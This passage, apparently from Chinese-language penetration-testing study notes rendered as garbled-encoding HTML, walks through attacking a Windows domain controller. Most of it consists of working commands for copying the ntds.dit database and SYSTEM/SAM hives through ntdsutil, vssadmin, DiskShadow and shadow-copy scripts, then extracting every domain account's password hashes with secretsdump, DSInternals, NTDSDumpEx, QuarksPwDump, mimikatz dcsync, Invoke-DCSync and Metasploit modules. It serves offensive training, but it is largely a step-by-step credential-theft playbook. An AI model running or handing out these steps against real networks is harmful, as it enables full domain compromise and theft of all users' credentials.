id="æ”»å‡»åŸŸæ§åˆ¶å™¨"><a href="#æ”»å‡»åŸŸæ§åˆ¶å™¨" class="headerlink" title="æ”»å‡»åŸŸæ§åˆ¶å™¨"></a>æ”»å‡»åŸŸæ§åˆ¶å™¨</h2><h3 id="å¯¼å‡ºntds-ditå·¥å…·ä½¿ç”¨"><a href="#å¯¼å‡ºntds-ditå·¥å…·ä½¿ç”¨" class="headerlink" title="å¯¼å‡ºntds.ditå·¥å…·ä½¿ç”¨"></a><strong>å¯¼å‡ºntds.ditå·¥å…·ä½¿ç”¨</strong></h3><h4 id="ntdsutilå·¥å…·æå–"><a href="#ntdsutilå·¥å…·æå–" class="headerlink" title="ntdsutilå·¥å…·æå–"></a>ntdsutilå·¥å…·æå–</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702110915019.png" alt="image-20220702110915019"></p><p>å‘½ä»¤:</p><p>åˆ›å»ºå¿«ç…§:</p><pre><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></pre><p>æŒ‚è½½å¿«ç…§:</p><pre><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></pre><p>æ‹·è´å¿«ç…§:</p><pre><code>copy C:\$SNAP_201808131112_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</code></pre><p>å¸è½½å¹¶åˆ é™¤å¿«ç…§:</p><pre><code>ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></pre><p>æŸ¥çœ‹å¿«ç…§</p><pre><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></pre><h4 id="vssadminå·¥å…·å¯¼å‡º"><a href="#vssadminå·¥å…·å¯¼å‡º" class="headerlink" title="vssadminå·¥å…·å¯¼å‡º"></a>vssadminå·¥å…·å¯¼å‡º</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702112559750.png" alt="image-20220702112559750"></p><p>å‘½ä»¤:</p><p>åˆ›å»ºå¿«ç…§:</p><pre><code>vssadmin create shadow /for=c:</code></pre><p>å¤åˆ¶æ–‡ä»¶</p><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,dit</code></pre><p>åˆ é™¤å¿«ç…§</p><pre><code>vssadmin delete shadows /for=c : /quite</code></pre><h4 id="åˆ©ç”¨vssown-vbsæå–"><a href="#åˆ©ç”¨vssown-vbsæå–" class="headerlink" title="åˆ©ç”¨vssown.vbsæå–"></a>åˆ©ç”¨vssown.vbsæå–</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702113237136.png" alt="image-20220702113237136"></p><pre><code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></pre><pre><code>cscript vssown.vbs /start #å¯åŠ¨å·å½±å¤åˆ¶æœåŠ¡cscipt vssown.vbs/create c #åˆ›å»ºä¸€ä¸ªcç›˜çš„å·å½±å‰¯æœ¬copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,ditescript vssown.vbs /list #åˆ—å‡ºå½“å‰å·å½±å‰¯æœ¬escript vssown.vbs /delete #åˆ é™¤å·å½±å‰¯æœ¬</code></pre><h4 id="NTDSUTILçš„IFM"><a href="#NTDSUTILçš„IFM" class="headerlink" title="NTDSUTILçš„IFM"></a>NTDSUTILçš„IFM</h4><pre><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot;q q</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114121276.png" alt="image-20220702114121276"></p><h4 id="åˆ©ç”¨powershell"><a href="#åˆ©ç”¨powershell" class="headerlink" title="åˆ©ç”¨powershell"></a>åˆ©ç”¨powershell</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114210607.png" alt="image-20220702114210607"></p><h4 id="DiskShadow"><a href="#DiskShadow" class="headerlink" title="DiskShadow"></a>DiskShadow</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702151613418.png" alt="image-20220702151613418"></p><p>DiskShadowå¯ä»¥ç”¨æ¥æ‰§è¡Œå‘½ä»¤</p><p>ç¤ºä¾‹:</p><p>å°†å‘½ä»¤å†™å…¥æ–‡ä»¶:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153003868.png" alt="image-20220702153003868"></p><p>ä½¿ç”¨diskshadowæ‰§è¡Œ</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153216260.png" alt="image-20220702153216260"></p><p>ä½¿ç”¨diskshadowå¯¼å‡ºntds.dit</p><p>å°†ä¸‹åˆ—å‘½ä»¤å†™å…¥åˆ°command.txtæ–‡ä»¶</p><pre><code>set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;cmd.exe&quot; /c copy k:\\windows\\ntds\\ntds.dit c:\\ntds.ditdelete shadows alllist shadows allresetexit</code></pre><p>ç„¶åæ‰§è¡Œ</p><pre><code>diskshadow /s C:\\command.txt # æ³¨æ„è¿™é‡Œéœ€è¦è¿›å…¥C:\Windows\System32ç›®å½•ä¸‹æ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702154731904.png" alt="image-20220702154731904"></p><p>å¯¼å‡ºntds.ditåï¼Œå¯ä»¥å°†system.hiveè½¬å‚¨ã€‚å› ä¸ºsystem.hiveä¸­å­˜æ”¾ç€ntds.dit çš„å¯†é’¥ï¼Œæ‰€ä»¥æ²¡æœ‰è¯¥å¯†é’¥ï¼Œå°†æ— æ³•æŸ¥çœ‹ntds.ditä¸­çš„ä¿¡æ¯</p><p>system.hiveæ–‡ä»¶åœ¨</p><pre><code>C:\Windows\System32\config</code></pre><p>ç›´æ¥ä½¿ç”¨æ³¨å†Œè¡¨å‘½ä»¤å°†system.liveæ–‡ä»¶å¯¼å‡ºåˆ°å½“å‰è·¯å¾„</p><pre><code>reg save hklm\system system.hive #åŒç†samä¹Ÿå¯ä»¥è¿™æ ·å¯¼å‡º reg save hklm\sam sam.hive</code></pre><h3 id="è§£æntds-dit"><a href="#è§£æntds-dit" class="headerlink" title="è§£æntds.dit"></a><strong>è§£æntds.dit</strong></h3><h4 id="ä½¿ç”¨esedbexportå’Œntdsxtractæ¢å¤ntds-ditæå–å…¶æ•£åˆ—å€¼"><a href="#ä½¿ç”¨esedbexportå’Œntdsxtractæ¢å¤ntds-ditæå–å…¶æ•£åˆ—å€¼" class="headerlink" title="ä½¿ç”¨esedbexportå’Œntdsxtractæ¢å¤ntds.ditæå–å…¶æ•£åˆ—å€¼"></a>ä½¿ç”¨esedbexportå’Œntdsxtractæ¢å¤ntds.ditæå–å…¶æ•£åˆ—å€¼</h4><p>esedbexportå®‰è£…:</p><p>åœ¨kaliä¸‹è½½libesedb</p><pre><code class="shell">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz</code></pre><p>ä¸‹è½½å®‰è£…ä¾èµ–ç¯å¢ƒ</p><pre><code class="shell">apt-get install autoconf automake autopoint libtool pkg-config</code></pre><p>è§£å‹</p><pre><code class="shell">tar -xzvf libesedb-experimental-20210424.tar.gz</code></pre><p>é…ç½®</p><pre><code class="shell">cd libesedb-20210424./configure</code></pre><p>ç¼–è¯‘</p><pre><code class="shell">make</code></pre><p>å®‰è£…</p><pre><code class="shell">sudo make install</code></pre><p>é…ç½®</p><pre><code class="shell">sudo ldconfig</code></pre><p>å®‰è£…å®Œæˆåä¼šåœ¨<code>/usr/local/bin</code>ç›®å½•ä¸‹çœ‹åˆ°<code>esedbexport</code>ç¨‹åº</p><p>å°†<code>ntds.dit</code>æ–‡ä»¶ä¸Šä¼ åˆ°kaliä¸­ï¼Œä½¿ç”¨<code>esedbexport</code>è¿›è¡Œæ¢å¤æ“ä½œ</p><pre><code class="shell">esedbexport -m table ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702170750923.png" alt="image-20220702170750923"></p><p>æå–æ ¹æ®ntds.ditçš„æ•£åˆ—å€¼æå–å…¶å†…å®¹çš„æ–¹æ³•:</p><p>ä½¿ç”¨ntdsxtract</p><p>å®‰è£…å‘½ä»¤:</p><pre><code class="shell">git clone https://github.com/csababarta/ntdsxtract.gitcd ntdsxtract/python setup.py build &amp;&amp; python setup.py install</code></pre><p>å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å°†ä¸Šä¸€æ­¥ä¸­å¯¼å‡ºçš„â€œntds.dit.exportâ€æ–‡ä»¶å¤¹ä¸­çš„datatable.3ã€link_table.5è¿™ä¸¤ä¸ªè¡¨å’Œä¹‹å‰è·å¾—çš„â€œSYSTEMâ€æ–‡ä»¶ä¸€å¹¶æ”¾å…¥ntdsxtractçš„æ–‡ä»¶å¤¹ä¸­ã€‚ç„¶åæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†åŸŸå†…çš„æ‰€æœ‰ç”¨æˆ·åŠæ•£åˆ—å€¼å¯¼å‡ºåˆ°result.txtæ–‡ä»¶ä¸­</p><pre><code class="shell">dsusers.py &lt;datatable&gt; &lt;link_table&gt; &lt;output_dir&gt; --syshive &lt;systemhive&gt; --passwordhashes &lt;format options&gt;</code></pre><p>å‘½ä»¤:</p><pre><code class="shell">python dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt# â€“pwdformaté€‰é¡¹æ˜¯é€‰æ‹©ä»¥ä»€ä¹ˆæ ¼å¼è¿›è¡Œæå–ï¼Œæœ‰john(John format)ã€ocl(oclHashcat)ã€ophc(OphCrack)ä¸‰ä¸ªé€‰é¡¹ã€‚</code></pre><p>æœ€ç»ˆè·å¾—æ–‡ä»¶</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162054315.png" alt="image-20220706162054315"></p><p>Ntdsxtractä¸­è¿˜å…·æœ‰ä¸€ä¸ªâ€œdscomputers.pyâ€å·¥å…·å¯ä»¥ä»åˆ†ç¦»å‡ºæ¥çš„è¡¨ä¸­æå–åŸŸä¸­è®¡ç®—æœºä¿¡æ¯ã€‚è¿™å¯¹äºç¦»çº¿åˆ†æç›®æ ‡ä¿¡æ¯æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚</p><p>åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å¯¹å®ƒæä¾›datatableï¼Œè¾“å‡ºç›®å½•ä»¥åŠè¾“å‡ºæ–‡ä»¶ï¼Œè¾“å‡ºæ–‡ä»¶çš„æ ¼å¼ä¸ºcsvï¼š</p><pre><code class="shell">python dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile domain_computers_info.csv </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162710090.png" alt="image-20220706162710090"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162817060.png" alt="image-20220706162817060"></p><h4 id="ä½¿ç”¨Impacketä¸­çš„secretsdump"><a href="#ä½¿ç”¨Impacketä¸­çš„secretsdump" class="headerlink" title="ä½¿ç”¨Impacketä¸­çš„secretsdump"></a>ä½¿ç”¨Impacketä¸­çš„secretsdump</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>secretsdump.pyæ˜¯Impacketå·¥å…·åŒ…ä¸­çš„ä¸€ä¸ªè„šæœ¬ï¼Œè¯¥è„šæœ¬å®ç°äº†å¤šç§ä¸éœ€è¦åœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä»»ä½•ä»£ç†çš„æƒ…å†µä¸‹è½¬å‚¨æœºå¯†æ•°æ®çš„æŠ€æœ¯ã€‚å¯¹äºSAMå’ŒLSA Secretsï¼ˆåŒ…æ‹¬ç¼“å­˜çš„å‡­æ®ï¼‰ï¼Œæˆ‘ä»¬å°½å¯èƒ½çš„å°è¯•ä»æ³¨å†Œè¡¨ä¸­è¯»å–ï¼Œç„¶åå°†hivesä¿å­˜åœ¨ç›®æ ‡ç³»ç»Ÿï¼ˆï¼…SYSTEMROOTï¼…\Tempç›®å½•ï¼‰ä¸­ï¼Œå¹¶ä»é‚£é‡Œè¯»å–å…¶ä½™çš„æ•°æ®ã€‚</p><p>secretsdump.pyæœ‰ä¸€ä¸ªæœ¬åœ°é€‰é¡¹ï¼Œå¯ä»¥è§£æNtds.ditæ–‡ä»¶å¹¶ä»Ntds.ditä¸­æå–å“ˆå¸Œæ•£åˆ—å€¼å’ŒåŸŸä¿¡æ¯ã€‚åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»è·å–åˆ°Ntds.ditå’ŒSYSTEMè¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚</p><p>ä½¿ç”¨æ–¹æ³•:</p><pre><code class="shell">git clone https://github.com/SecureAuthCorp/impacketcd impacketsudo python3 setup.py installcd ..cd examplepython3 secretsdump.py -system /ç›®å½•/system.hive -ntds /ç›®å½•/ntds.dit LOCAL</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706222324453.png" alt="image-20220706222324453"></p><h4 id="PowerShellä¸‹çš„åˆ©ç”¨"><a href="#PowerShellä¸‹çš„åˆ©ç”¨" class="headerlink" title="PowerShellä¸‹çš„åˆ©ç”¨"></a>PowerShellä¸‹çš„åˆ©ç”¨</h4><p>DSInternals PowerShellæ¨¡å—æä¾›äº†æ„å»ºåœ¨æ¡†æ¶ä¹‹ä¸Šçš„æ˜“äºä½¿ç”¨çš„cmdletã€‚ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ç¦»çº¿ntds.ditæ–‡ä»¶æ“ä½œä»¥åŠé€šè¿‡ç›®å½•å¤åˆ¶æœåŠ¡ï¼ˆDRSï¼‰è¿œç¨‹åè®®æŸ¥è¯¢åŸŸæ§åˆ¶å™¨ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/MichaelGrafnetter/DSInternals">https://github.com/MichaelGrafnetter/DSInternals</a></p><p>æ”¯æŒç³»ç»Ÿï¼š</p><ul><li>Windows Server 2012 R2</li><li>Windows Server 2008 R2</li><li>Windows 10 64-bit</li><li>Windows 8.1 64-bit</li><li>Windows 7 64-bit</li></ul><p>å®‰è£…ä¸é…ç½®æ–¹æ³•ï¼š</p><pre><code class="shell">PowerShell 5.0ï¼šInstall-Module DSInternalsæˆ–Install-Module -Name DSInternals -RequiredVersion 3.2.1PowerShell 3.0ã€4.0ï¼šè§£å‹å‹ç¼©åŒ… cd C:\DSInternalsImport-Module .\DSInternals</code></pre><p>ä½¿ç”¨DSInternalsæ¨¡å—æå–ç”¨æˆ·å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè·å–Ntds.ditã€SYSTEMè¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚å°†Ntds.ditã€SYSTEMè¿™ä¸¤ä¸ªæ–‡ä»¶å¯¼å‡ºå¹¶æ‹–åˆ°æˆ‘ä»¬æœ¬åœ°åï¼Œå³å¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è·å–æ‰€æœ‰è´¦æˆ·å“ˆå¸Œï¼š</p><pre><code class="shell">Import-Module DSInternals       // å¯¼å…¥DSInternalsæ¨¡å—// è·å–æ‰€æœ‰è´¦æˆ·ä¿¡æ¯ï¼š$key = Get-Bootkey -SystemHivePath &#39;C:\ç›®å½•\system.hive&#39;    Get-ADDBAccount -All -DBPath &#39;C:\ç›®å½•\ntds.dit&#39; -Bootkey $key</code></pre><p>è¿˜å¯ä»¥å¯¼å‡ºæ”¯æŒHashcatæ ¼å¼çš„å“ˆå¸Œï¼š</p><pre><code class="shell">$key = Get-Bootkey -SystemHivePath &#39;C:\ç›®å½•\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\ç›®å½•\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File hashes.txt</code></pre><h4 id="ä½¿ç”¨NTDSDumpex-exeå¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼"><a href="#ä½¿ç”¨NTDSDumpex-exeå¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼" class="headerlink" title="ä½¿ç”¨NTDSDumpex.exeå¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼"></a>ä½¿ç”¨NTDSDumpex.exeå¯ä»¥å¯¼å‡ºæ•£åˆ—å€¼</h4><p>ä½¿ç”¨NTDSDumpex.exeå¯ä»¥è¿›è¡Œå¯¼å‡ºæ•£åˆ—å€¼çš„æ“ä½œã€‚</p><p>å°†ntds.ditã€NTDSDumpex.exeã€system.hive æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤å³å¯å¯¼å‡ºåŸŸè´¦å·å’Œæ•£åˆ—å€¼ã€‚</p><p>NTDSDumpEx.exeä¸‹è½½åœ°å€ï¼š<a href="https://github.com/zcgonvh/NTDSDumpEx">https://github.com/zcgonvh/NTDSDumpEx</a></p><p>è·å–keyï¼šreg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</p><p>ä½¿ç”¨NTDSDumpExè·å–æ‰€æœ‰åŸŸç”¨æˆ·çš„Hash</p><pre><code class="shell">NTDSDumpEx.exe -d ntds.dit -s system.hive -o hash.txt</code></pre><h4 id="åœ¨çº¿åˆ©ç”¨dcsyncè·å–æå–Ntds-ditä¸­çš„å“ˆå¸Œ"><a href="#åœ¨çº¿åˆ©ç”¨dcsyncè·å–æå–Ntds-ditä¸­çš„å“ˆå¸Œ" class="headerlink" title="åœ¨çº¿åˆ©ç”¨dcsyncè·å–æå–Ntds.ditä¸­çš„å“ˆå¸Œ"></a>åœ¨çº¿åˆ©ç”¨dcsyncè·å–æå–Ntds.ditä¸­çš„å“ˆå¸Œ</h4><p>DCSyncæ˜¯Mimikatzåœ¨2015å¹´æ·»åŠ çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œç”±Benjamin DELPY gentilkiwiå’ŒVincent LE TOUXå…±åŒç¼–å†™ï¼Œå…¶èƒ½å¤Ÿåˆ©ç”¨å·å½±æ‹·è´æœåŠ¡ç›´æ¥è¯»å–ndts.ditå¹¶å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„å“ˆå¸Œå€¼ã€‚éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚</p><p>Mimikatzä¸‹è½½åœ°å€ï¼š<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p><p>åˆ©ç”¨Mimikatzçš„dcsyncåŠŸèƒ½è·å–æå–Ntds.ditä¸­çš„å“ˆå¸Œçš„æ“ä½œå¦‚ä¸‹ï¼š</p><p>åœ¨åŸŸå†…ä»»æ„ä¸€å°ä¸»æœºä¸Šè¿è¡Œmimikatzå¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><pre><code>lsadump::dcsync /domain:xxx.com /all /csvlsadump::dcsync /domain:god.org /all /csv</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706225104256.png" alt="image-20220706225104256"></p><p>æˆ–è€…</p><pre><code class="shell">privilege::debugloglsadump::lsa /inject</code></pre><h4 id="åœ¨çº¿-PowerShellæå–Ntds-ditä¸­çš„å“ˆå¸Œ"><a href="#åœ¨çº¿-PowerShellæå–Ntds-ditä¸­çš„å“ˆå¸Œ" class="headerlink" title="åœ¨çº¿-PowerShellæå–Ntds.ditä¸­çš„å“ˆå¸Œ"></a>åœ¨çº¿-PowerShellæå–Ntds.ditä¸­çš„å“ˆå¸Œ</h4><p>å³Invoke-DCSync.ps1è„šæœ¬ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><p>è¯¥è„šæœ¬é€šè¿‡Invoke-ReflectivePEinjectionè°ƒç”¨mimikatz.dllä¸­çš„dcsyncåŠŸèƒ½ï¼Œå¹¶åˆ©ç”¨dcsyncç›´æ¥è¯»å–ntds.ditå¾—åˆ°åŸŸç”¨æˆ·å¯†ç æ•£åˆ—å€¼ã€‚</p><p>åœ¨åŸŸå†…ä»»ä½•ä¸€å°ä¸»æœºä¸Šé¢æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><pre><code class="shell">Set-Executionpolicy bypassImport-Module .\Invoke-DCSync.ps 1Invoke-DCSync -DumpForest | ft -wrap -autosize    // å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hashInvoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      // å¯¼å‡ºåŸŸå†…administratorè´¦æˆ·çš„hash</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102847191.png" alt="image-20220707102847191"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707102954770.png" alt="image-20220707102954770"></p><h4 id="åœ¨çº¿-ä½¿ç”¨metasploitè·å–åŸŸæ•£åˆ—"><a href="#åœ¨çº¿-ä½¿ç”¨metasploitè·å–åŸŸæ•£åˆ—" class="headerlink" title="åœ¨çº¿-ä½¿ç”¨metasploitè·å–åŸŸæ•£åˆ—"></a>åœ¨çº¿-ä½¿ç”¨metasploitè·å–åŸŸæ•£åˆ—</h4><ul><li>Ntds.dit(ä¹Ÿè¢«ç§°ä¸ºActive Directory database)åŒ…å«äº†å½“å‰åŸŸç”¨æˆ·ä¸­æ‰€æœ‰çš„ç”¨æˆ·çš„è´¦å·ä¿¡æ¯å’Œå…¶hashå€¼</li><li>é»˜è®¤è·¯å¾„: C:\Windows\NTDS</li><li>åªèƒ½é€šè¿‡åŸŸæ§åˆ¶å™¨è¿›ç¨‹å’Œåè®®è®¿é—®</li></ul><p>å¯èƒ½ç”¨åˆ°çš„æ¨¡å—:</p><pre><code>post/windows/gather/ntds_location #è¯¥æ¨¡å—å¯æŸ¥çœ‹è·¯å¾„ntdspost/windows/gather/smart_hashdump #åœ¨çº¿å¯¼å‡ºåŸŸè´¦æˆ·hash(å»ºè®®2012ä»¥ä¸Šä½¿ç”¨)auxiliary/admin/smb/psexec_ntdsgrab #åˆ©ç”¨åŸŸç®¡è´¦æˆ·ï¼Œå¯¼å‡ºntdså¿…è¦æ–‡ä»¶åˆ°æœ¬åœ°post/windows/gather/ntds_grabber #åˆ©ç”¨powershellå°†ntdså¿…è¦æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°åä½¿ç”¨post/windows/gather/credentials/domain_hashdump #ä»‹ç»å…¶æ–¹æ³•</code></pre><h4 id="åœ¨çº¿-ä½¿ç”¨vshadowå’ŒQuarksPwDumpå¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼"><a href="#åœ¨çº¿-ä½¿ç”¨vshadowå’ŒQuarksPwDumpå¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼" class="headerlink" title="åœ¨çº¿-ä½¿ç”¨vshadowå’ŒQuarksPwDumpå¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼"></a>åœ¨çº¿-ä½¿ç”¨vshadowå’ŒQuarksPwDumpå¯¼å‡ºåŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼</h4><p>åœ¨æ­£å¸¸çš„åŸŸç¯å¢ƒä¸­ï¼Œntds.dit æ–‡ä»¶é‡ŒåŒ…å«å¤§é‡çš„ä¿¡æ¯ï¼Œä½“ç§¯è¾ƒå¤§ï¼Œä¸æ–¹ä¾¿ä¿å­˜åˆ°æœ¬åœ°ã€‚</p><p>å¦‚æœåŸŸæ§åˆ¶å™¨ä¸Šæ²¡æœ‰å®‰è£…æ€æ¯’è½¯ä»¶ï¼Œæ”»å‡»è€…å°±èƒ½ç›´æ¥è¿›å…¥åŸŸæ§åˆ¶å™¨ï¼Œå¯¼å‡º ntds.dit å¹¶è·å¾—åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼ï¼Œè€Œä¸éœ€è¦å°† ntds.dit ä¿å­˜åˆ°æœ¬åœ°ã€‚</p><p>QuarksPwDump å¯ä»¥å¿«é€Ÿã€å®‰å…¨ã€å…¨é¢åœ°è¯»å–å…¨éƒ¨åŸŸè´¦å·å’ŒåŸŸæ•£åˆ—å€¼ã€‚</p><p>QuarksPwDump ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat ä½¿ç”¨å¾®è½¯çš„å·å½±æ‹·è´æŠ€æœ¯ï¼Œèƒ½å¤Ÿå¤åˆ¶è¢«é”å®šçš„æ–‡ä»¶åŠè¢«å…¶ä»–ç¨‹åºæ‰“å¼€çš„æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹</p><pre><code class="shell">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER=%SystemDrive%set SOURCE_RELATIVE_PATH=windows\ntds\ntds.ditset DESTINATION_PATH=%~dp0@echo ...Determine the scripts to be executed/generated...set CALLBACK_SCRIPT=%~dpnx0set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del /f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive</code></pre><p>shadow.exe æ˜¯ä» Windows SDK ä¸­æå–å‡ºæ¥çš„ï¼Œéœ€è¦å…ˆå®‰è£… Windows SDKï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>åœ¨è¿™ä¸ªé¡¹ç›®ä¸­ï¼Œä½œè€…å·²ç»ç»™å‡ºäº†shadow.exe:</p><p><a href="https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy">https://github.com/tuthimi/quarkspwdump/tree/master/ShadowCopy</a></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162512699.png" alt="image-20220707162512699"></p><p>é€‰æ‹©å¯¹åº”ç‰ˆæœ¬ä¸‹è½½å³å¯</p><p>å°†è¿™ä¸‰ä¸ªç¨‹åºæ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œæ‰§è¡ŒShowCopy.bat</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162553598.png" alt="image-20220707162553598"></p><p>æ‰§è¡Œå:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162651423.png" alt="image-20220707162651423"></p><p>ä½¿ç”¨ esentutl ä¿®å¤å¯¼å‡ºçš„ ntds.dit æ–‡ä»¶:</p><pre><code class="shell">esentutl /p /o ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162752787.png" alt="image-20220707162752787"></p><p>æœ€åé€šè¿‡ QuarksPwDump.exe å¯¼å‡ºåŸŸè´¦å·å’Œæ•£åˆ—å€¼:</p><pre><code class="shell">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o result.txt</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162932295.png" alt="image-20220707162932295"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220707162952291.png" alt="image-20220707162952291"></p><h2 id="è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡"><a href="#è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡" class="headerlink" 